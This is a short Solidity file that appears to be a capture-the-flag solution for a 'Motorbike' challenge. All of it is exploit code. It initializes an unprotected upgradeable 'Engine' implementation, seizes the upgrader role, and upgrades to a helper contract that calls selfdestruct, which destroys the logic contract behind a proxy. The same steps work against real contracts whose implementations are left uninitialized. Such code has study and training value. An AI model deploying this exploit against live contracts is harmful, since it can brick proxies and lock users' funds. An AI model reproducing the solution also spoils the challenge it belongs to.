pragma solidity ^0.8.14;

contract Exploit {
    address public upgrader;
    uint256 public horsePower;

    function exploit() external {
        upgrader = address(uint160(0xdead));
        horsePower = uint256(0xdead);
        selfdestruct(payable(0));
    }
}

interface Engine {
    function horsePower() external returns (uint256);
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract MotorbikeExploit {
    constructor(address target) {
        Engine(target).initialize();
        Exploit e = new Exploit();
        Engine(target).upgradeToAndCall(address(e), abi.encodeWithSignature("exploit()"));
    }
}
